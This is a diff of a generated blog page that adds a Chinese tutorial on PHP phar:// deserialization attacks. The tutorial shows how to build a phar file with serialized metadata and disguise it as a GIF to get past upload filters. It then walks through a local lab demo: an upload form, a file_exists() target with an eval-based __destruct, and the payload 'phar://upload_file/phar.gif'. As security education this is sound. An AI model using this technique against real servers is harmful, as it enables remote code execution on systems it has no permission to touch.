@@ -261,7 +261,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">0</span> / Reading time: <span class="post-count">1 min</span></span>
+                        <span>Word count: <span class="post-count">1,250</span> / Reading time: <span class="post-count">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -390,7 +390,37 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        
+        <h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。<br>这个新的攻击方式被他公开在了美国的BlackHat会议演讲上，演讲主题为：”不为人所知的php反序列化漏洞”。它可以使攻击者将相关漏洞的严重程度升级为远程代码执行。我们在RIPS代码分析引擎中添加了对这种新型攻击的检测。</p>
+<h1 id="流包装"><a href="#流包装" class="headerlink" title="流包装"></a>流包装</h1><p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<br>例如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include(&apos;php://filter/read=convert.base64-encode/resource=index.php&apos;);</span><br><span class="line">include(&apos;data://text/plain;base64,xxxxxxxxxxxx&apos;);</span><br></pre></td></tr></table></figure>
+<p><code>phar://</code>也是流包装的一种</p>
+<h1 id="phar原理"><a href="#phar原理" class="headerlink" title="phar原理"></a>phar原理</h1><h2 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h2><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
+<h2 id="官方手册"><a href="#官方手册" class="headerlink" title="官方手册"></a>官方手册</h2><p>phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。<br><img src="/phar/1.jpg" alt="1"></p>
+<h1 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h1><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p>
+<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p>
+<p>phar.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new TestObject();</span><br><span class="line">    $o -&gt; data=&apos;hu3sky&apos;;</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>访问后,会生成一个phar.phar在当前目录下。<br><img src="/phar/2.jpg" alt="2"><br>用winhex打开<br><img src="/phar/3.jpg" alt="3"><br>可以明显的看到meta-data是以序列化的形式存储的。<br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：<br><img src="/phar/4.jpg" alt="4"></p>
+<p>phar_fan.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject&#123;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this -&gt; data;   // TODO: Implement __destruct() method.</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">include(&apos;phar://phar.phar&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>输出<br><img src="/phar/5.jpg" alt="5"></p>
+<h1 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h1><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    $phar = new Phar(&apos;phar.phar&apos;);</span><br><span class="line">    $phar -&gt; startBuffering();</span><br><span class="line">    $phar -&gt; setStub(&apos;GIF89a&apos;.&apos;&lt;?php __HALT_COMPILER();?&gt;&apos;);   //设置stub，增加gif文件头</span><br><span class="line">    $phar -&gt;addFromString(&apos;test.txt&apos;,&apos;test&apos;);  //添加要压缩的文件</span><br><span class="line">    $object = new TestObject();</span><br><span class="line">    $object -&gt; data = &apos;hu3sky&apos;;</span><br><span class="line">    $phar -&gt; setMetadata($object);  //将自定义meta-data存入manifest</span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/phar/6.jpg" alt="6"></p>
+<p>采用这种方法可以绕过很大一部分上传检测。</p>
+<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><h2 id="phar文件要能够上传到服务器端。"><a href="#phar文件要能够上传到服务器端。" class="headerlink" title="phar文件要能够上传到服务器端。"></a>phar文件要能够上传到服务器端。</h2><p>如<code>file_exists()</code>，<code>fopen()</code>，<code>file_get_contents()</code>，<code>file()</code>等文件操作的函数</p>
+<h2 id="要有可用的魔术方法作为“跳板”。"><a href="#要有可用的魔术方法作为“跳板”。" class="headerlink" title="要有可用的魔术方法作为“跳板”。"></a>要有可用的魔术方法作为“跳板”。</h2><h2 id="文件操作函数的参数可控，且-、-、phar等特殊字符没有被过滤。"><a href="#文件操作函数的参数可控，且-、-、phar等特殊字符没有被过滤。" class="headerlink" title="文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。"></a>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</h2><h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p><code>upload_file.php</code>，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif<br><code>upload_file.html</code> 文件上传表单<br><code>file_un.php</code> 存在<code>file_exists()</code>，并且存在<code>__destruct()</code></p>
+<h2 id="文件内容"><a href="#文件内容" class="headerlink" title="文件内容"></a>文件内容</h2><p><code>upload_file.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &apos;.&apos;)+1))== &apos;gif&apos;) &#123;</span><br><span class="line">    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;];</span><br><span class="line">    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line"></span><br><span class="line">    if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">      &#123;</span><br><span class="line">      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    else</span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">      &quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">      echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;Invalid file,you can only upload gif&quot;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p><code>upload_file.html</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://localhost/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<p><code>file_un.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=$_GET[&apos;filename&apos;];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var $output = &apos;echo &quot;ok&quot;;&apos;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure>
+<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>首先是根据file_un.php写一个生成phar的php文件，当然需要绕过gif，所以需要加GIF89a，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用phar://执行代码</p>
+<h2 id="构造代码"><a href="#构造代码" class="headerlink" title="构造代码"></a>构造代码</h2><p><code>eval.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var $output = &apos;echo &quot;ok&quot;;&apos;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = new Phar(&apos;phar.phar&apos;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(&apos;GIF89a&apos;.&apos;&lt;?php __HALT_COMPILER();?&gt;&apos;);</span><br><span class="line">$phar -&gt; addFromString(&apos;test.txt&apos;,&apos;test&apos;);</span><br><span class="line">$object = new AnyClass();</span><br><span class="line">$object -&gt; output= &apos;phpinfo();&apos;;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>
+<p>访问eval.php，会在当前目录生成phar.phar，然后修改后缀 gif<br><img src="/phar/8.jpg" alt="7"><br>接着上传,文件会上传到upload_file目录下<br><img src="/phar/7.jpg" alt="8"><br>然后利用file_un.php。<br>payload:filename=phar://upload_file/phar.gif</p>
+<p><img src="/phar/9.jpg" alt="9">     </p>
+
     </article>
     <!-- license  -->
     
@@ -543,7 +573,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#概要"><span class="toc-number">1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#流包装"><span class="toc-number">2.</span> <span class="toc-text">流包装</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phar原理"><span class="toc-number">3.</span> <span class="toc-text">phar原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-stub"><span class="toc-number">3.1.</span> <span class="toc-text">a stub</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#官方手册"><span class="toc-number">3.2.</span> <span class="toc-text">官方手册</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#演示"><span class="toc-number">4.</span> <span class="toc-text">演示</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#将phar伪造成其他格式的文件"><span class="toc-number">5.</span> <span class="toc-text">将phar伪造成其他格式的文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用条件"><span class="toc-number">6.</span> <span class="toc-text">利用条件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#phar文件要能够上传到服务器端。"><span class="toc-number">6.1.</span> <span class="toc-text">phar文件要能够上传到服务器端。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#要有可用的魔术方法作为“跳板”。"><span class="toc-number">6.2.</span> <span class="toc-text">要有可用的魔术方法作为“跳板”。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件操作函数的参数可控，且-、-、phar等特殊字符没有被过滤。"><span class="toc-number">6.3.</span> <span class="toc-text">文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#demo"><span class="toc-number">7.</span> <span class="toc-text">demo</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境准备"><span class="toc-number">7.1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件内容"><span class="toc-number">7.2.</span> <span class="toc-text">文件内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实现过程"><span class="toc-number">7.3.</span> <span class="toc-text">实现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#构造代码"><span class="toc-number">7.4.</span> <span class="toc-text">构造代码</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -556,66 +586,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1145,34 +1115,6 @@ top:50vh;
     
     
     
-    <div class="archive-year"> 2018 </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/2018/05/09/php反序列化学习/" >ctf一道题目。php反序列化学习</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/03/28/cookie与session/" >cookie与session的笔记</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
     <div class="archive-year"> 2022 </div>
     <ul class="year-list">
     
@@ -1267,6 +1209,11 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/2018/05/09/php反序列化学习/" >ctf一道题目。php反序列化学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2018/05/03/渗透测试/" >记一次kali渗透测试靶机</a>
         </li>
     
@@ -1302,35 +1249,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2018/03/23/VehicleWorkshop/" >VehicleWorkshop上传漏洞本地复现</a>
+            <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2018/04/10/scrapy笔记/" >Scrapy笔记</a>
         </li>
     
     
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/04/18/Broad Crawls~Benchmarking/" >[Untitled Post]</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/23/Hooskcms/" >Hooskcms 几个小洞</a>
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2018/04/01/代码执行/" >rnpnet tiki-calendar.php页面存在代码执行漏洞</a>
         </li>
     
     
@@ -1345,6 +1269,48 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/eyou前台getshell/" >eyoucms前台getshell复现</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2018/03/23/VehicleWorkshop/" >VehicleWorkshop上传漏洞本地复现</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/php-security-calendar-2017/" >php-security-calendar-2017</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/04/18/Broad Crawls~Benchmarking/" >[Untitled Post]</a>
         </li>
     
     
@@ -1381,18 +1347,22 @@ top:50vh;
     
         </ul>
     
-    <div class="archive-year"> 2018 </div>
+    <div class="archive-year"> Invalid date </div>
     <ul class="year-list">
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2018/04/10/scrapy笔记/" >Scrapy笔记</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/23/Hooskcms/" >Hooskcms 几个小洞</a>
         </li>
     
     
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2018/04/01/代码执行/" >rnpnet tiki-calendar.php页面存在代码执行漏洞</a>
-        </li>
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
     
     
         <li class="archive-post-item">
@@ -1415,7 +1385,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/php-security-calendar-2017/" >php-security-calendar-2017</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/03/28/cookie与session/" >cookie与session的笔记</a>
         </li>
     
     </div>
@@ -1460,39 +1430,39 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
     
+        <span class="sidebar-category-name" data-categories="学习笔记"><span class="iconfont-archer">&#xe60a;</span>学习笔记</span>
+    
         <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
     
-        <span class="sidebar-category-name" data-categories="学习笔记"><span class="iconfont-archer">&#xe60a;</span>学习笔记</span>
+        <span class="sidebar-category-name" data-categories="Arbitrary-File-Upload"><span class="iconfont-archer">&#xe60a;</span>Arbitrary-File-Upload</span>
+    
+        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
     
         <span class="sidebar-category-name" data-categories="sql注入"><span class="iconfont-archer">&#xe60a;</span>sql注入</span>
     
-        <span class="sidebar-category-name" data-categories="Arbitrary-File-Upload"><span class="iconfont-archer">&#xe60a;</span>Arbitrary-File-Upload</span>
+        <span class="sidebar-category-name" data-categories="Empire"><span class="iconfont-archer">&#xe60a;</span>Empire</span>
+    
+        <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
     
         <span class="sidebar-category-name" data-categories="git"><span class="iconfont-archer">&#xe60a;</span>git</span>
     
         <span class="sidebar-category-name" data-categories="write-up"><span class="iconfont-archer">&#xe60a;</span>write-up</span>
     
-        <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
-    
-        <span class="sidebar-category-name" data-categories="Empire"><span class="iconfont-archer">&#xe60a;</span>Empire</span>
-    
-        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
-    
         <span class="sidebar-category-name" data-categories="php反序列化"><span class="iconfont-archer">&#xe60a;</span>php反序列化</span>
     
         <span class="sidebar-category-name" data-categories="scrapy"><span class="iconfont-archer">&#xe60a;</span>scrapy</span>
+    
+        <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
+    
+        <span class="sidebar-category-name" data-categories="代码执行"><span class="iconfont-archer">&#xe60a;</span>代码执行</span>
     
         <span class="sidebar-category-name" data-categories="xxe"><span class="iconfont-archer">&#xe60a;</span>xxe</span>
     
         <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
     
-        <span class="sidebar-category-name" data-categories="代码执行"><span class="iconfont-archer">&#xe60a;</span>代码执行</span>
-    
         <span class="sidebar-category-name" data-categories="后门"><span class="iconfont-archer">&#xe60a;</span>后门</span>
     
         <span class="sidebar-category-name" data-categories="线下赛"><span class="iconfont-archer">&#xe60a;</span>线下赛</span>
-    
-        <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
